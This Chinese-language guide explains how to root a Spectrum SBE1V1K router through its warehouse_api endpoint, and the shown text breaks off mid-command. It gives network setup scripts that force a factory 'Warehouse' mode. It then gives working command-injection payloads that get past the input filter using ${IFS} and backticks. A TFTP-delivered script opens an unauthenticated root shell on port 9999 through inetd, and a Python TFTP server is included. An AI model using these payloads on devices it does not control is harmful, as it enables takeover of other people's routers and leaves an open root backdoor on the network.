# Spectrum SBE1V1K 免拆机 Root 访问与恢复指南

> 本文档面向**自有或已获明确授权的设备**，用于维护、测试、恢复和功能验证。它记录了获取 root 管理权限的操作流程及其实现机制。请勿将本文方法用于不属于您、或未获授权管理的设备。
>
> 关键环节已结合真机测试和固件分析复核；相关限制会在相应步骤中说明。

## 先读这里

本文的操作核心并不复杂，但网络拓扑和固件分支必须正确：

1. 用一台可控的上游路由器为 SBE 的 **WAN 口** 提供 DHCP、IPv6 和指定 DNS，使其进入 Warehouse 模式；
2. 用另一根网线将维护电脑接到 SBE 的任意 **LAN 口**；
3. 在维护电脑上确认模式和版本，再按对应版本分支执行步骤 4；
4. 获得管理访问后，关闭临时监听端口，并仅保留受限的 LAN 管理通道。

不要把上游路由器的 LAN 口接到 SBE 的 LAN 口。正确连接是：**上游路由器 LAN → SBE WAN，维护电脑 → SBE LAN**。

### 覆盖的版本与验证状态

`/cgi-bin/index.cgi` 页面中的 **FW Version** 来自运行时 OVSDB 的 `AWLAN_Node.firmware_version`。本文覆盖的版本及验证状态如下：

| 页面显示的 FW Version | 对应步骤 4 分支 | 备注 |
|---|---|---|
| `1.0.5` | 4A（旧固件） | 仅镜像静态分析；可能可用单发请求后从 LAN 直接开启并连接 22，尚未真机验证 |
| `1.1.3.1` | 4B（新固件） | 已修补部分输入过滤问题；需要两段式 TFTP 流程 |


### 本文结构

- 步骤 1：配置上游测试网络，使 SBE 的 WAN 口进入 Warehouse 模式。
- 步骤 2–3：从 LAN 侧连接并确认模式。
- 步骤 4：根据固件版本获取临时管理访问。
- 步骤 5–6：登录、收紧暴露面，以及可选的持久化管理。
- 故障排查：按现象定位常见的网络、模式和连接问题。

## 前置条件

- SBE1V1K 设备运行**原厂固件**（`1.1.3.1` 已真机验证；`1.0.5` 仅完成镜像静态分析；本方法对 1.0.x 系列同样适用）
- 一台可控的上游路由器或测试网络（提供 DHCP + IPv6 + 自定义 DNS），其 **LAN 口接设备 WAN 口**
- 维护主机接设备 **LAN 口**（Web 服务只监听 LAN 网桥，见步骤 2 说明）
- 网线两根

## 总体流程

```
上游路由器 LAN ──→ 设备 WAN 口    (提供 DHCP/IPv6/DNS，触发 Warehouse 模式)
维护电脑 ────────→ 设备 LAN 口    (访问 Web 接口、发送请求、SSH)

设备上电 → Warehouse 模式 → 一个 HTTPS POST → SSH 连接 → root
```

⚠️ 这两条连接缺一不可：
- 只有 WAN：设备进了 Warehouse 模式，但 Web 服务不在 WAN 侧，无法操作
- 只有 LAN：能访问 Web 服务，但设备处于 Cloud 模式，除 `get_mode` 外全部拒绝

---

## 步骤 1：搭建测试网络（接 WAN 口）

设备启动时 `modecheck.sh` 要求 WAN 口同时获得 IPv4（DHCP）和全局 IPv6（SLAAC），并且 DNS 能解析 `warehouse.ctdi.local`。

### 方式 A： OpenWrt 路由器

自动读取 OpenWrt 的 LAN IPv4 地址，并优先保留已有的 ULA /48。标准 OpenWrt 的备份放在 /root。

```bash
#!/bin/sh
ssh root@<openwrt设备IP>
STAMP="$(date +%Y%m%d-%H%M%S)"
WAREHOUSE_IP="$(uci -q get network.lan.ipaddr)"
ULA_PREFIX="$(uci -q get network.globals.ula_prefix)"

# 1. 检查 LAN 地址
if [ -z "$WAREHOUSE_IP" ]; then
    echo "错误：无法读取 network.lan.ipaddr"
    echo "请确认 LAN 接口配置名是否为 lan："
    echo "uci show network"
    exit 1
fi

# 2. 备份
cp /etc/config/network "/root/network.before_sbe_${STAMP}"
cp /etc/config/dhcp   "/root/dhcp.before_sbe_${STAMP}"

# 3. 删除旧 warehouse DNS 映射，避免重复
for item in $(uci -q get dhcp.@dnsmasq[0].address); do
    case "$item" in
        /warehouse.ctdi.local/*|/warehouse.ctdi.com/*)
            uci -q del_list "dhcp.@dnsmasq[0].address=$item"
            ;;
    esac
done

# 4. DNS 映射到 OpenWrt 自己的 LAN 地址
uci add_list "dhcp.@dnsmasq[0].address=/warehouse.ctdi.local/${WAREHOUSE_IP}"
uci add_list "dhcp.@dnsmasq[0].address=/warehouse.ctdi.com/${WAREHOUSE_IP}"

# 5. 使用现有 ULA /48；没有合适的 /48 时创建实验前缀
case "$ULA_PREFIX" in
    */48)
        echo "保留现有 ULA：$ULA_PREFIX"
        ;;
    *)
        ULA_PREFIX='fd36:3600:100::/48'
        uci set network.globals='globals'
        uci set network.globals.ula_prefix="$ULA_PREFIX"
        echo "设置实验 ULA：$ULA_PREFIX"
        ;;
esac

# 6. 关键：允许 odhcpd 向下游路由器委派前缀
uci set network.lan.ip6assign='60'

# 7. 开启 RA、状态化 DHCPv6 和默认路由通告
uci set dhcp.lan.ra='server'
uci set dhcp.lan.dhcpv6='server'
uci set dhcp.lan.ra_management='1'
uci set dhcp.lan.ra_default='1'

# 8. 保存并应用
uci commit network
uci commit dhcp

/etc/init.d/network reload
/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart

echo "配置完成"
echo "LAN IPv4：$WAREHOUSE_IP"
echo "ULA 前缀：$(uci -q get network.globals.ula_prefix)"
echo "备份时间戳：$STAMP"
```

验证：

```bash
uci get network.globals.ula_prefix
uci get network.lan.ip6assign
uci get dhcp.lan.ra_management

ubus call network.interface.lan status
ip -6 addr show dev br-lan

nslookup warehouse.ctdi.local "$(uci get network.lan.ipaddr)"
```

ubus 输出应包含类似：

```json
"ipv6-prefix-assignment": [
    {
        "address": "fd36:3600:100::",
        "mask": 60
    }
]
```

### 方式 B：小米 AX3600 路由器

小米 AX3600 固件会在每次开机时通过 `/etc/init.d/ipv6`（启动顺序 `S58ipv6`）重建 `/etc/config/network`，删除手工添加的 `network.globals`、`network.lan.ip6addr`，并把 `network.lan.ip6assign` 重新设置为 `64`。

因此有两种启用方式：

- 临时启用：立即生效。只要小米不重启，可以反复重启 SBE；小米自身重启或断电后配置会被覆盖。
- 永久启用：创建 `S59sbe_lab_ipv6` 启动服务，在小米原厂 `S58ipv6` 之后自动恢复实验配置。

#### 登录小米

在电脑上执行：

```bash
ssh \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  root@192.168.31.1
```

---

#### B-1：临时启用

下面的配置会立即生效，但小米断电或重启后需要重新执行。

```bash
#!/bin/sh

STAMP="$(date +%Y%m%d-%H%M%S)"
WAREHOUSE_IP='192.168.31.1'
ULA_PREFIX='fd36:3600:100::/48'

# 1. 创建固定的实验前备份；如果已经存在，则不覆盖
[ -e /data/network.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/network /data/network.before_sbe1v1k_ipv6

[ -e /data/dhcp.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/dhcp /data/dhcp.before_sbe1v1k_ipv6

# 同时保留带时间戳的备份
cp /etc/config/network "/data/network.before_sbe_${STAMP}"
cp /etc/config/dhcp   "/data/dhcp.before_sbe_${STAMP}"

# 2. 删除已有的 warehouse DNS 映射，避免重复
for item in $(uci -q get dhcp.@dnsmasq[0].address); do
    case "$item" in
        /warehouse.ctdi.local/*|/warehouse.ctdi.com/*)
            uci -q del_list "dhcp.@dnsmasq[0].address=$item"
            ;;
    esac
done

# 3. 添加 warehouse DNS 映射
uci add_list \
    "dhcp.@dnsmasq[0].address=/warehouse.ctdi.local/${WAREHOUSE_IP}"

uci add_list \
    "dhcp.@dnsmasq[0].address=/warehouse.ctdi.com/${WAREHOUSE_IP}"

# 4. 强制开启小米 LAN 侧内核 IPv6（关键修复，缺此步 SBE 永远拿不到 IPv6）
# 小米的 IPv6 模式为 off 时（uci show ipv6 显示 enabled='0' mode='off'），
# UCI 里会残留 network.lan.ipv6='0'，netifd 据此在内核层禁用 br-lan 的
# IPv6（net.ipv6.conf.br-lan.disable_ipv6=1）。此时下面配置的所有地址
# 都加不到接口上，odhcpd 因 br-lan 无 public prefix 拒绝发 RA。
# 实测现象：uci 配置全对，但 br-lan 上一个 inet6 都没有、SBE 无 IPv6。
if [ "$(uci -q get network.lan.ipv6)" = "0" ]; then
    uci delete network.lan.ipv6
    echo "已删除 network.lan.ipv6='0'（开启内核 IPv6）"
fi

# 5. 添加实验 IPv6 地址
# 2001:db8::/32 仅用于文档和实验，不可用于公网
uci set network.lan.ip6addr='2001:db8:3600:1::1/64'

# 6. 创建本地 ULA /48 前缀池
uci set network.globals='globals'
uci set network.globals.ula_prefix="$ULA_PREFIX"

# 关键：LAN 获得 /60 后，odhcpd 才能继续向 SBE 委派 IA_PD
uci set network.lan.ip6assign='60'

# 7. 开启 RA 和状态化 DHCPv6
uci set dhcp.lan.ra='server'
uci set dhcp.lan.dhcpv6='server'
uci set dhcp.lan.ra_management='1'
uci set dhcp.lan.ra_default='1'

# 8. 保存
uci commit network
uci commit dhcp

# 9. 应用
/etc/init.d/network reload

# 保险：确认 br-lan 内核 IPv6 未被禁用（正常 reload 后应为 0）
sysctl -w net.ipv6.conf.br-lan.disable_ipv6=0

/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart

echo "SBE 实验 IPv6 已临时启用"
echo "备份时间戳：$STAMP"
echo "小米重启后需要重新执行本脚本"
```

执行完成后，保持小米开机，给 SBE 断电约 5 秒再重新上电。

---

#### B-2：永久启用

永久方式会创建 `/etc/init.d/sbe_lab_ipv6`，启用后生成 `/etc/rc.d/S59sbe_lab_ipv6`。启动顺序为：

```text
S58ipv6
    ↓
小米原厂脚本重建 IPv6/network 配置
    ↓
S59sbe_lab_ipv6
    ↓
恢复 SBE 实验所需的 IPv6-PD 配置
```

执行下面的完整脚本：

```bash
#!/bin/sh

STAMP="$(date +%Y%m%d-%H%M%S)"

# 1. 创建固定的实验前备份；如果已经存在，则不覆盖
[ -e /data/network.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/network /data/network.before_sbe1v1k_ipv6

[ -e /data/dhcp.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/dhcp /data/dhcp.before_sbe1v1k_ipv6

# 同时保留带时间戳的备份
cp /etc/config/network "/data/network.before_sbe_${STAMP}"
cp /etc/config/dhcp   "/data/dhcp.before_sbe_${STAMP}"

# 2. 创建永久启动服务
cat > /etc/init.d/sbe_lab_ipv6 <<'EOF'
#!/bin/sh /etc/rc.common

START=59
STOP=10

WAREHOUSE_IP='192.168.31.1'
ULA_PREFIX='fd36:3600:100::/48'

start() {
    # 强制开启小米 LAN 侧内核 IPv6（关键修复）
    # 小米 IPv6 模式为 off 时 UCI 里会残留 network.lan.ipv6='0'，
    # netifd 据此禁用 br-lan 的 IPv6，下面配置的地址全部无法生效。
    if [ "$(uci -q get network.lan.ipv6)" = "0" ]; then
        uci delete network.lan.ipv6
        logger -t sbe_lab_ipv6 "removed network.lan.ipv6='0' (enable kernel IPv6)"
    fi

    # 删除已有的 warehouse DNS 映射，避免重复
    for item in $(uci -q get dhcp.@dnsmasq[0].address); do
        case "$item" in
            /warehouse.ctdi.local/*|/warehouse.ctdi.com/*)
                uci -q del_list "dhcp.@dnsmasq[0].address=$item"
                ;;
        esac
    done

    # 添加 warehouse DNS 映射
    uci add_list \
        "dhcp.@dnsmasq[0].address=/warehouse.ctdi.local/${WAREHOUSE_IP}"

    uci add_list \
        "dhcp.@dnsmasq[0].address=/warehouse.ctdi.com/${WAREHOUSE_IP}"

    # 添加实验 IPv6 地址
    # 2001:db8::/32 仅用于实验，不可用于公网
    uci set network.lan.ip6addr='2001:db8:3600:1::1/64'

    # 创建 ULA /48 前缀池
    uci set network.globals='globals'
    uci set network.globals.ula_prefix="$ULA_PREFIX"

    # LAN 使用 /60，使 odhcpd 能够向 SBE 委派 IA_PD
    uci set network.lan.ip6assign='60'

    # 开启 RA 和状态化 DHCPv6
    uci set dhcp.lan.ra='server'
    uci set dhcp.lan.dhcpv6='server'
    uci set dhcp.lan.ra_management='1'
    uci set dhcp.lan.ra_default='1'

    # 保存配置
    uci commit network
    uci commit dhcp

    # netifd 已由 S20network 启动，可以直接重新加载
    ubus call network reload

    # 等待网络配置应用完成
    sleep 2

    # 保险：确认 br-lan 内核 IPv6 未被禁用（正常 reload 后应为 0）
    sysctl -w net.ipv6.conf.br-lan.disable_ipv6=0

    # 重新加载 DNS 和 DHCPv6 服务
    /etc/init.d/dnsmasq restart
    /etc/init.d/odhcpd restart

    logger -t sbe_lab_ipv6 \
        "SBE lab IPv6 configuration restored after Xiaomi S58ipv6"
}

stop() {
    # 停止服务时不自动删除当前网络配置
    return 0
}
EOF

# 3. 设置执行权限
chmod 755 /etc/init.d/sbe_lab_ipv6

# 4. 永久启用
/etc/init.d/sbe_lab_ipv6 enable

# 5. 立即运行一次，无需等待下次重启
/etc/init.d/sbe_lab_ipv6 start

echo "SBE 实验 IPv6 已永久启用"
echo "启动顺序：S58ipv6 -> S59sbe_lab_ipv6"
echo "备份时间戳：$STAMP"
```

---

#### 检查永久启动服务

```bash
ls -l /etc/init.d/sbe_lab_ipv6
ls -l /etc/rc.d/S59sbe_lab_ipv6
```

期望看到：

```text
/etc/rc.d/S59sbe_lab_ipv6 -> ../init.d/sbe_lab_ipv6
```

---

#### 验证 UCI 配置

```bash
uci get network.globals.ula_prefix
uci get network.lan.ip6assign
uci get network.lan.ip6addr

uci get dhcp.lan.ra
uci get dhcp.lan.dhcpv6
uci get dhcp.lan.ra_management
uci get dhcp.lan.ra_default

# 关键：LAN 侧内核 IPv6 必须是开的
uci -q get network.lan.ipv6          # 期望：空（不输出任何内容）
sysctl net.ipv6.conf.br-lan.disable_ipv6    # 期望：0
```

期望输出：

```yaml
fd36:3600:100::/48
60
2001:db8:3600:1::1/64
server
server
1
1

net.ipv6.conf.br-lan.disable_ipv6 = 0
```

> 若 `uci -q get network.lan.ipv6` 输出 `0`，或 sysctl 输出为 `1`：说明小米的 IPv6 模式为 off，`network.lan.ipv6='0'` 使 netifd 在内核层禁用了 br-lan 的 IPv6。此时上面的地址配置全部无法生效，odhcpd 拒绝发 RA，SBE 拿不到 IPv6。删除该选项并重新加载网络即可（B-1/B-2 脚本已内置此修复）。

#### 验证运行时 IPv6 前缀池

```bash
ubus call network.interface.lan status
```

输出中应包含类似内容：

```json
"ipv6-prefix-assignment": [
    {
        "address": "fd36:3600:100::",
        "mask": 60,
        "local-address": {
            "address": "fd36:3600:100::1",
            "mask": 60
        }
    }
]
```

检查 `br-lan` 地址：

```bash
ip -6 addr show dev br-lan
```

期望包含：

```text
inet6 fd36:3600:100::1/60 scope global
inet6 2001:db8:3600:1::1/64 scope global
```

#### 可选：验证 RA 和 DHCPv6

当 SBE 仍停留在 `Cloud` 模式、且上面的 UCI 配置看起来正确时，可在小米上抓包确认 IPv6 协商是否完整。需要先安装 `tcpdump`：

```bash
tcpdump -ni br-lan -e -vv \
    'icmp6 or (udp port 546 or udp port 547)'
```

正常顺序应包含 Router Solicitation / Advertisement，以及 DHCPv6 的 Solicit、Advertise、Request、Reply。Advertise 和 Reply 中应同时出现 `IA_NA` 与 `IA_PD`；若 `IA_PD` 返回 `NoPrefixAvail`，说明前缀委派尚未配置成功。

#### 验证 warehouse DNS

```bash
nslookup warehouse.ctdi.local 192.168.31.1
nslookup warehouse.ctdi.com 192.168.31.1
```

期望解析到 `192.168.31.1`。

#### 验证 SBE IPv6

SBE 启动后，在小米上执行：

```bash
ip -6 neigh show dev br-lan
```

成功时应该看到 SBE 的 MAC 和分配给它的全局作用域 IPv6（例如 `fd36:3600:100::xxxx`）。

---

#### 完成测试后：恢复小米配置

若使用的是 **B-1 临时方式**，用首次运行脚本创建的备份恢复：

```bash
cp /data/network.before_sbe1v1k_ipv6 /etc/config/network
cp /data/dhcp.before_sbe1v1k_ipv6 /etc/config/dhcp

/etc/init.d/network reload
/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart
```

若使用的是 **B-2 永久方式**，应先移除启动服务，再恢复配置：

```bash
/etc/init.d/sbe_lab_ipv6 disable 2>/dev/null
rm -f /etc/init.d/sbe_lab_ipv6

cp /data/network.before_sbe1v1k_ipv6 /etc/config/network
cp /data/dhcp.before_sbe1v1k_ipv6 /etc/config/dhcp

/etc/init.d/network reload
/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart

test ! -e /etc/rc.d/S59sbe_lab_ipv6 && echo "启动钩子已移除"
```

恢复前请确认备份文件存在；如果没有备份，请勿直接覆盖当前网络配置。

---

#### 重要说明

`2001:db8::/32` 是文档和实验专用 IPv6 网段，不能用于公网通信。

本实验真正解决 SBE 无法获取 IPv6 的关键配置是：

```text
LAN 侧内核 IPv6 已开启（network.lan.ipv6 ≠ '0' 且 disable_ipv6=0）
        +
ULA /48 前缀池
        +
LAN ip6assign=60
        +
RA Managed 标志
        +
DHCPv6 Server
        =
IA_NA + IA_PD
```

**最常见的翻车点（实测）：小米的 IPv6 模式为 off 时**（`uci show ipv6` 显示 `enabled='0' mode='off'`），UCI 里会残留 `network.lan.ipv6='0'`。netifd 看到该选项就会在内核层设置 `net.ipv6.conf.br-lan.disable_ipv6=1`，br-lan 上**一个 IPv6 地址都不会有**（连 link-local 都没有），odhcpd 日志报 `A default route is present but there is no public prefix on br-lan thus we don't announce a default route!` 并拒绝发 RA。表现是：小米上 UCI 配置全部正确，但 SBE 拿不到任何 IPv6、停在 Cloud 模式。**必须先删除 `network.lan.ipv6` 选项再 reload**（B-1/B-2 脚本已内置检测与修复）。

SBE 成功获得 IA_NA 和 IA_PD 后，`br-wan` 会出现 `scope global` IPv6，随后 `modecheck.sh` 才会继续执行 warehouse DNS 判断并写入 `/tmp/router_mode`，成功值为 `Warehouse`。

---

## 步骤 2：维护主机接入 LAN 口

**为什么必须接 LAN:** 固件内 `vm` 守护进程调用 `/sbin/restart_webservice.sh br-home`，lighttpd 只绑定 br-home（LAN 网桥）的 IP；`/etc/config/firewall` 中 WAN 区 input 为 REJECT。WAN 侧无法访问 Web 接口。**新旧两版固件在这一点上行为一致**，维护操作只能从 LAN 侧到达。

- 维护主机网线接 SBE1V1K 任意 **LAN 口**
- 设备自带 DHCP（地址池 192.168.1.100-249），主机自动获取地址
- 设备自身 IP 通常为 **192.168.1.1**（如不同，查主机获取的默认网关）
- 如果 DHCP 拿不到地址，手动配置 192.168.1.100/24

给 SBE1V1K 上电，等待 2-3 分钟完成启动。

> 下文把维护主机在 br-home 侧拿到的地址（即上面的 192.168.1.x）记作 `<维护主机IP>`，命令中出现时请自行替换成实际值。

---

## 步骤 3：验证 Warehouse 模式

从维护主机：

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_mode'
```

返回值含义（新旧固件一致）：

| 返回 | 含义 | 处理 |
|---|---|---|
| `Warehouse` | 模式判定通过，可继续 | 进入步骤 4 |
| `Cloud` | `modecheck.sh` 未通过 | 回查测试网络（见下） |
| `INVALID_REQUEST` | 请求方式/body 不对 | 必须 POST 且 body 非空 |

`modecheck.sh` 开机时要求三条**同时**满足，缺一即停在 `Cloud`：

1. `br-wan` 有 IPv4（DHCP）；
2. `br-wan` 有 **scope global** 的 IPv6（SLAAC 或 DHCPv6 均可，不限来源）；
3. DNS 能解析 `warehouse.ctdi.local`（busybox `nslookup` **直查 WAN 下发的 DNS**，不经过本机 dnsmasq，因此本机 rebind_protection 不影响判定）。

⚠️ `modecheck.sh` **只在开机时执行一次**，结果写入 `/tmp/router_mode`；该文件不存在时 `get_mode` 同样返回 `Cloud`。改动测试网络配置后，**必须给 SBE 断电重启**才会重新判定。

---

## 步骤 4：发起固件升级请求

先确认固件版本，**新旧两版防护不同，请求写法完全不同**：

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_current_firmware_version'
```

| | 旧固件 1.0.5 | 新固件 1.1.3.1 |
|---|---|---|
| `warehouse_api` 字符校验 | 无 | 拦截 `;` `$` `\|` `'` `"`（报 `INVALID_REQUEST_CHARACTER`） |
| 请求形态 | 一次性，`;` 直接拼接命令 | 两段式，反引号 + tftp 投递脚本 |
| `firmware` 参数里的空格 | 不允许（sscanf `%s` 截断），用 `${IFS}` | 同样不允许 |
| `tftpserver` 带 `:port` | 可用 | **永久卡死**，只能用裸 IP + 69 端口 |
| SSH 初始状态 | **可能可直接使用 22**（仅镜像分析） | SSHM 会停止 Dropbear，且默认 LAN 规则不放行 22 |
| 拿到 root 的方式 | 预计可 SSH，密码=序列号大写（见步骤 5；未真机验证） | 先用请求开启 ≥1024 的临时 shell 端口；后续再配置受限的 22 |

---

### 4A. 旧固件 1.0.5（单发请求）

> **验证状态：仅镜像静态分析，尚未真机测试。** 镜像中 Dropbear 默认监听 TCP 22，LAN 防火墙默认放行 22；因此完成本步骤后，设备**可能**可从 LAN 侧直接 SSH，无需 9999 临时 shell。实际设备若行为不同，请以运行时防火墙和服务状态为准。

`warehouse_api` 不校验字符，`;` `$` 反引号 管道都能用，一条请求直接拼接命令：

```bash
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=127.0.0.1&firmware=x;/bin/rm${IFS}-f${IFS}/tmp/update_attempt_file${IFS}/tmp/update_firmware_id;/etc/init.d/dropbear${IFS}start;:'
```

等待数秒到数分钟（见下"时序说明"），然后验证：

```bash
# 按镜像分析，端口 22 此时可能已开放（需真机验证）
nc -z -v 192.168.1.1 22
```

若端口开放，继续 **步骤 5（SSH 连接）**。

#### payload 逐段解释

| 片段 | 作用 |
|---|---|
| `command=update_firmware` | 触发固件升级流程 |
| `tftpserver=127.0.0.1` | 填任意 IP 即可；用 127.0.0.1 让 tftp 快速失败（无需真实 TFTP 服务器） |
| `firmware=x;...` | `x` 是占位文件名；`;` 之后是附加的命令 |
| `${IFS}` | **替代空格**（原因见下） |
| `/bin/rm -f ...` | 清除升级尝试计数器，方便重复使用 |
| `/etc/init.d/dropbear start` | 启动 SSH 服务（核心目标） |
| 结尾的 `;:` | `:` 是 shell 空命令，用来吃掉拼接残留的参数 |

#### ⚠️ payload 中不能出现空格（重要）

参数传递路径中有一层 `sscanf("%[^/]/%s", host, path)`（libopensync.so）。`%s` 在第一个空白字符处截断——payload 里的空格会让后面的内容全部丢失。

解决办法：用 `${IFS}` 代替空格。`${IFS}` 在到达最终的 `/bin/sh` 之前只是普通文本（不含空白，不会被截断），进入 `/bin/sh` 后展开为空格/制表符并完成分词。

#### 时序说明

`popen()` 执行的完整命令是：

```
timeout 300 tftp -g -r x;rm ...;dropbear start;: -l /tmp/firmware.img 127.0.0.1 69
```

shell 顺序执行：`tftp` 先运行并失败（127.0.0.1 无 TFTP 服务，通常几秒内结束，最坏 300 秒），**之后**附加的命令才执行。所以 curl 返回后 SSH 不一定立即可用，稍等再试。

另外 `fw_utils` 的重试循环会让同一条 payload 在一次请求里执行多次（retries=3 → 最多 4 次），重复执行 `dropbear start` 无害。

---

### 4B. 新固件 1.1.3.1（两段式请求）

**新增防护:** `warehouse_api` 在执行前对整个 POST body 做字符校验，`;` `$` `|` `'` `"` 一律拒绝（返回 `INVALID_REQUEST_CHARACTER`），旧固件的 `;` 拼接 + `${IFS}` 方式**失效**。

**可用字符:** 校验放行了反引号 `` ` `` 以及 `<` `>` `/` `{}` `()` 等，因此新方式用**反引号命令替换 + tftp 投递脚本**。

#### 字符约束对照

| 字符 | 能否用 | 说明 |
|---|---|---|
| `` ` `` | ✅ | 命令替换，新方式核心 |
| `<` `>` `/` `{}` `()` | ✅ | |
| `;` `$` `\|` `'` `"` | ❌ | body 校验拦截 |
| `&` | ❌ | 是 POST 参数分隔符，会截断 `firmware` 值 |
| 空格 | ❌ | `sscanf %s` 截断，`firmware` 参数内不可出现 |

#### tftpserver 关键限制

`tftpserver` **不能带 `:port`**（如 `x.x.x.x:6969`），否则 `fw_utils` 永久卡在 `FWS:Working`（只能断电恢复）。因此只能填**裸 IP**，设备固定从 **69 端口**取文件——维护主机必须把 TFTP 服务开在 69 端口（需 root/管理员）。

#### 两段式请求原理

`firmware` 参数写成（注意整体**无空格**、**无被禁字符**）：

```
s.sh`sh</tmp/firmware.img`
```

`fw_utils` 拼成 `tftp://<维护主机IP>/s.sh`...`` 后解析出 PATH=`s.sh`sh</tmp/firmware.img``，`popen` 实际执行：

```
timeout 300 tftp -g -r s.sh`sh</tmp/firmware.img` -l /tmp/firmware.img <维护主机IP> 69
```

shell 先执行反引号内的 `sh < /tmp/firmware.img`（命令替换），再跑 tftp。于是：

- **第 1 次发送**:`/tmp/firmware.img` 还不存在，反引号空跑；tftp 把 `s.sh` 下载写入 `/tmp/firmware.img`。
- **第 2 次发送**:反引号执行 `sh < /tmp/firmware.img`，即以 root 运行第 1 次下载好的 `s.sh`。

所以**同一条 payload 要发两次**：先投递脚本、再触发执行。`s.sh` 脚本**文件内容不受字符限制**（空格、`&`、引号都可以）。

#### 操作步骤

**第 1 步：编写 payload 脚本 `s.sh`。** 示例：用 busybox `inetd` 在 9999 端口开一个 root shell（inetd 配置在可写的 `/tmp`，端口 ≥1024 命中防火墙放行规则）：

```sh
#!/bin/sh
rm -f /tmp/update_attempt_file /tmp/update_firmware_id
printf '9999 stream tcp nowait root /bin/sh sh -i\n' > /tmp/inetd.conf
killall inetd 2>/dev/null
nohup /bin/busybox inetd /tmp/inetd.conf >/dev/null 2>&1 &
```

**第 2 步：维护主机部署 TFTP（69 端口）。** 下面是一个最小可用实现，同时支持"下发 s.sh（RRQ）"与"接收脚本回传（WRQ）"；把 `s.sh` 放在同目录，用 root 运行：

```python
#!/usr/bin/env python3
# 存为 tftp_srv.py，与 s.sh 同目录，sudo python3 tftp_srv.py
import socket, struct, os
ROOT = '.'; RX = './tftp_rx'; os.makedirs(RX, exist_ok=True)
def rrq(peer, name):
    p = os.path.join(ROOT, os.path.basename(name))
    d = open(p,'rb').read() if os.path.isfile(p) else None
    t = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if d is None:
        t.sendto(struct.pack('!HH',5,1)+b'nf\x00', peer); t.close(); return
    blk = 1
    for i in range(0, len(d), 512):
        pkt = struct.pack('!HH',3,blk)+d[i:i+512]
        while True:
            t.sendto(pkt, peer); t.settimeout(3)
            try:
                a,_ = t.recvfrom(1024)
                if len(a) >= 4 and struct.unpack('!HH', a[:4]) == (4, blk): break
            except socket.timeout:
                continue
        blk += 1
    t.close()
def wrq(peer, name):
    p = os.path.join(RX, os.path.basename(name))
    t = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    t.sendto(struct.pack('!HH',4,0), peer)
    out = open(p,'wb'); exp = 1; t.settimeout(10)
    while True:
        try: pkt, ap = t.recvfrom(1024)
        except socket.timeout: break
        if len(pkt) < 4: continue
        op, blk = struct.unpack('!HH', pkt[:4])
        if op != 3: continue
        if blk == exp:
            out.write(pkt[4:]); t.sendto(struct.pack('!HH',4,blk), ap)
            if len(pkt) < 516: break
            exp += 1
        else:
            t.sendto(struct.pack('!HH',4,blk), ap)
    out.close(); t.close()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(('0.0.0.0', 69))
print('TFTP on :69')
while True:
    d, peer = s.recvfrom(1024)
    if len(d) < 4: continue
    op = struct.unpack('!H', d[:2])[0]
    name = d[2:].split(b'\x00')[0].decode(errors='replace')
    if op == 1: rrq(peer, name)
    elif op == 2: wrq(peer, name)
```

**第 3 步：发送请求（同一条，发两次，间隔约 8 秒）:**

```bash
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=<维护主机IP>&firmware=s.sh`sh</tmp/firmware.img`'
sleep 8
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=<维护主机IP>&firmware=s.sh`sh</tmp/firmware.img`'
```

**第 4 步：验证执行:**

```bash
nc -z 192.168.1.1 9999 && echo "shell 端口已开"
nc 192.168.1.1 9999        # 进入 root shell，用 id 确认 uid=0
```

#### 1.1.3.1：临时 root 入口与 SSH 管理

在 `1.1.3.1` 上，4B 的目标是先通过 9999 端口获得一次临时 root shell；此时不要预期 TCP 22 已经可用。运行记录显示 SSHM 在启动时会执行 `/etc/init.d/dropbear stop`，而 22 也不在默认 LAN 放行范围内；即使手动启动 Dropbear，该状态仍可能被 SSHM 恢复。厂商 Dropbear 还会拒绝 `root` 和自建用户名。

如需稳定使用 SSH，请继续完成步骤 6：它使用 UID/GID 均为 0 的 `operator` 账户，并通过 `nfm_ip4tables.sh` 写入仅允许 `br-home`（LAN）的 TCP 22 规则。不要以手工 `iptables` 规则替代该步骤，因为 NFM 重建规则时会清除未纳入 OVSDB 状态的规则。`/tmp` 中的 shell、密码状态和防火墙运行态均会在重启后消失。

#### 其余注意事项（实测踩坑）

- **公钥应放 `/etc/dropbear/authorized_keys`**：该目录绑定到 p29 的持久 `/data/etc/dropbear`。使用 `operator` 登录；`root` 和自建用户名会被厂商 Dropbear 拒绝。
- **脚本别往 stderr 刷大量输出**：大输出写文件后 `tftp -p` 回传，否则 popen 管道缓冲写满会永久卡 `FWS:Working`。
- **每次先清尝试计数器**：`rm -f /tmp/update_attempt_file /tmp/update_firmware_id`，避免单启动周期次数耗尽后静默失败。
- **tftpserver 绝不可带 `:port`**，否则设备卡死需断电。

---

## 步骤 5：SSH 连接

根据 `1.0.5` 镜像静态分析，执行步骤 4A 后 Dropbear **可能**已在 22 端口启动，且 LAN 侧默认放行。此结论尚未真机验证：

```bash
# root 密码 = 设备序列号的大写
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_serial'

ssh root@192.168.1.1
```

若 SSH 成功，即已获得 root，全程无需拆机。

### 新固件 1.1.3.1

完成步骤 6 的运行态管理器后，以 `operator` 登录 22。它是 UID/GID 0，等效 root shell；不要使用 `root` 用户名。旧 Dropbear 的 RSA 主机密钥需要客户端显式启用兼容算法：

```bash
ssh -p 22 -i <你的私钥路径> \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
